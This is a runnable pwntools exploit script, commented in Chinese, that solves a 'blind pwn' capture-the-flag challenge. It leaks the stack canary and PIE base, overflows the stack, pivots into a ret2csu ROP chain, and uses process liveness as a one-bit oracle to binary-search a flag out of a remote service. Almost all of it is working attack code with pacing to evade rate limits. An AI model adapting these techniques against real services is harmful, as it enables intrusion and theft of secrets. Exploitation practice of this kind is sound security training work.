#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
blind pwn —— 远端(只看得到 socket)版本
=================================================
远端现象: blind() 之后 close(1)/close(2) + seccomp(只放行 read/exit),
          socket 上再也不会收到任何字节, 退出码也看不到。
可观测的唯一信号: 服务端 wrapper 把我们的 stdin 转发给子进程时,
          子进程若已死 -> write 得到 EPIPE -> 连接立刻关闭(EOF);
          子进程还活着 -> 数据进管道, 连接保持。
=> 用一个"活着/死掉"的 1-bit 信道。

比较原语(不需要 libc, 全靠二进制自己的代码):
    get_input 的循环条件
        200388: mov eax, [rbp-0xc]
        20038b: cmp dword [rbp-0x1c], eax     <- 直接跳到这里
        20038e: ja  0x200343                  ; [rbp-0x1c] > eax  -> 去读一个字节并写回
        200390: jmp 0x200393                  ; 否则落到 get_input 尾声
        200394: mov rax,[rbp-8]; xor rax,fs:0x28; je leave_ret ; 否则 __stack_chk_fail
  把 flag[i] 读到 [rbp-0x1c], 用 getnum() 让 eax = 猜测值:
    * flag[i] >  guess -> 走进读取循环, 把读到的字节写到 [rbp-8]=canary 上
                          -> canary 被破坏 -> __stack_chk_fail -> abort 卡死 = 活着
    * flag[i] <= guess -> 直接过 canary 检查 -> leave;ret -> exit(0)  = 死掉
  于是 cmp_gt(i, g) 就是 "flag[i] > g", 二分 8 次拿到一个字节。
"""
import os, sys, time, struct
from pwn import *

context.arch = 'amd64'
context.log_level = os.environ.get('LOG', 'error')

HERE = os.path.dirname(os.path.abspath(__file__))
BIN, LD = './pwn', './ld-linux-x86-64.so.2'

CSU_INIT  = 0x2005a0
POP_RDI   = 0x200603
POP_RBP5  = 0x2005fb   # pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_POP   = 0x2005fa   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL  = 0x2005e0   # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
GET_INPUT = 0x20031c
GETNUM    = 0x2003aa   # getnum() 本体 -> eax = atoi(read(0,15))
LEAVE_RET = 0x20059d
EXIT_PLT  = 0x2000f0
CMP_LOOP  = 0x20038b   # cmp dword [rbp-0x1c], eax ; ja 0x200343
GOT_READ  = 0x600fa8

STAGE2_OFF  = 0x601200
FRAME_OFF   = STAGE2_OFF + 0x300
SCRATCH_OFF = STAGE2_OFF + 0x500
BLOCK       = 0x78
SIZE_LEAK, SIZE_MAX = 0x59, 0x88
FLAG_FD = int(os.environ.get('FD', '3'))      # remote 上 flag 可能不在 fd 3


def start():
    if args.REMOTE:
        host, port = args.REMOTE.split(':')
        return remote(host, int(port))
    return process([LD, '--library-path', '.', BIN], cwd=HERE)


def csu_read(pie, fd, dst, n):
    s  = p64(pie + CSU_POP)
    s += p64(0)                # rbx = 0
    s += p64(1)                # rbp = rbx+1
    s += p64(pie + GOT_READ)   # r12 -> read
    s += p64(fd)               # edi
    s += p64(dst)              # rsi
    s += p64(n)                # rdx
    s += p64(pie + CSU_CALL)
    s += p64(0) + p64(0) * 6
    assert len(s) == BLOCK
    return s


def build_blob(pie, idx, canary):
    """返回要写进 .bss 的整块数据(链 + 假 get_input 帧)"""
    frame   = pie + FRAME_OFF
    scratch = pie + SCRATCH_OFF

    chunks = (5, 5) if idx == 0x0a else (idx, 0)

    chain  = p64(0)                                    # pivot 的 pop rbp
    chain += csu_read(pie, FLAG_FD, scratch, chunks[0])   # 丢掉前 chunks[0] 字节
    chain += csu_read(pie, FLAG_FD, scratch, chunks[1])   # 丢掉前 chunks[1] 字节
    chain += csu_read(pie, FLAG_FD, frame - 0x1c, 1)      # flag[idx] -> [frame-0x1c]
    chain += p64(pie + POP_RBP5)                       # rbp = frame
    chain += p64(frame) + p64(0) * 4
    chain += p64(pie + GETNUM)                         # eax = 我们的猜测值
    chain += p64(pie + CMP_LOOP)                       # 比较 + 分支

    blob = bytearray(b'\x00' * (FRAME_OFF - STAGE2_OFF))
    blob[0:len(chain)] = chain

    fr = bytearray(b'\x00' * 0x40)
    # 相对 frame 的偏移
    def put(off, data):
        fr[0x20 + off:0x20 + off + len(data)] = data
    put(-0x1c, p32(0))                 # size = flag[idx] (read 只改最低字节)
    put(-0x18, p64(frame - 8))         # 读取循环里 store 的目标 = canary 槽
    put(-0x0c, p32(0))                 # i = 0
    put(-0x08, canary)                 # 真 canary
    put(0x00, p64(0))                  # leave 弹进 rbp
    put(0x08, p64(0))                  # 死掉那支: leave;ret -> 0 触发 SIGSEGV
                                       # (不要用 exit@plt: 新 libc 上延迟绑定在 seccomp 里会卡住)
    put(0x10, p64(pie + POP_RDI))
    put(0x18, p64(0))
    put(0x20, p64(pie + EXIT_PLT))
    fb = FRAME_OFF - STAGE2_OFF - 0x20          # fr[0] 对应 frame-0x20
    blob[fb:fb + len(fr)] = fr
    return bytes(blob)


PACE = float(os.environ.get('PACE', '0.8'))


def cmp_gt(idx, guess, verbose=False):
    """True  <=>  flag[idx] > guess"""
    time.sleep(PACE)          # 平台有连接频率限制, 慢一点
    p = start()
    try:
        p.recvuntil(b'name size')
        p.send(b'136\n')
        p.recvuntil(b'> ')
        p.send(b'A' * (SIZE_LEAK - 1) + b'X' + b'\n')
        data = p.recvuntil(b'Now you have 1 choice to change your name.')
        body = data.split(b'Your name is: ', 1)[1].rsplit(b'\nNow you have 1 choice', 1)[0]
        if len(body) < SIZE_LEAK + 13:
            return None
        canary = b'\x00' + body[SIZE_LEAK:SIZE_LEAK + 7]
        pie = u64(body[SIZE_LEAK + 7:SIZE_LEAK + 13].ljust(8, b'\x00')) - CSU_INIT
        if pie & 0xfff or pie >> 48:
            return None

        stage2 = pie + STAGE2_OFF
        blob = build_blob(pie, idx, canary)

        p1  = b'B' * 0x58 + canary + p64(stage2)
        p1 += p64(pie + POP_RDI) + p64(stage2) + p64(pie + GET_INPUT) + p64(pie + LEAVE_RET)
        assert len(p1) == SIZE_MAX
        if b'\n' in p1 or b'\n' in blob:
            return None

        p.send(p1)
        time.sleep(1.05)
        p.send(blob + b'\n')          # get_input(stage2, 0xc330) 写进 .bss
        time.sleep(0.15)
        p.send(str(guess).encode() + b'\n')   # getnum() -> eax
        time.sleep(0.35)
        # 只发 1 个字节:
        #   * 真分支(flag>guess) 会在读取循环里再 read 一次 -> 阻塞 -> 活着
        #   * 假分支已经 exit(0) -> wrapper 写管道得 EPIPE -> 连接立刻断
        try:
            p.send(b'A')
        except Exception:
            return False          # 写不进去 => 子进程已经退出
        alive = detect_alive(p)
        if verbose:
            log.info('idx=%d guess=%d alive=%s' % (idx, guess, alive))
        return alive
    except Exception:
        if os.environ.get('LOG') == 'debug':
            import traceback; traceback.print_exc()
        return None
    finally:
        try:
            p.close()
        except Exception:
            pass


def detect_alive(p):
    """远端: 1.2s 内 socket 没 EOF = 活着; 本地: 进程还没退出 = 活着

    注意: pwntools 的 recv(timeout=..) 超时也返回 b'', 不能用来区分 EOF,
    这里用 select + raw recv 判断真正的 EOF。
    """
    if args.REMOTE:
        import select
        sock = p.sock
        t0 = time.time()
        while time.time() - t0 < 1.2:
            r, _, _ = select.select([sock], [], [], 0.05)
            if r:
                try:
                    d = sock.recv(4096)
                except Exception:
                    return False
                if not d:
                    return False        # 真 EOF -> 子进程已死
            time.sleep(0.01)
        return True
    time.sleep(0.5)
    return p.poll() is None


def read_byte(idx):
    lo, hi = 0, 255
    while lo < hi:
        mid = (lo + hi) // 2
        r = None
        for _ in range(6):
            r = cmp_gt(idx, mid)
            if r is not None:
                break
        if r is None:
            time.sleep(8)      # 可能被限流, 歇一会儿
            r = None
            for _ in range(3):
                r = cmp_gt(idx, mid)
                if r is not None:
                    break
                time.sleep(8)
            if r is None:
                return None
        if r:
            lo = mid + 1
        else:
            hi = mid
    return lo


def main():
    n = int(os.environ.get('MAXLEN', '60'))
    out = b''
    for i in range(n):
        b = None
        for _ in range(4):
            b = read_byte(i)
            if b is not None:
                break
        if b is None:
            log.warning('idx %d failed', i)
            break
        out += bytes([b])
        log.success('[%02d] 0x%02x %r' % (i, b, out))
        if b in (0x0a, 0x00) or out.endswith(b'}'):
            break
    print('\nFLAG = %s' % out.rstrip(b'\n').decode('latin1'))


if __name__ == '__main__':
    main()
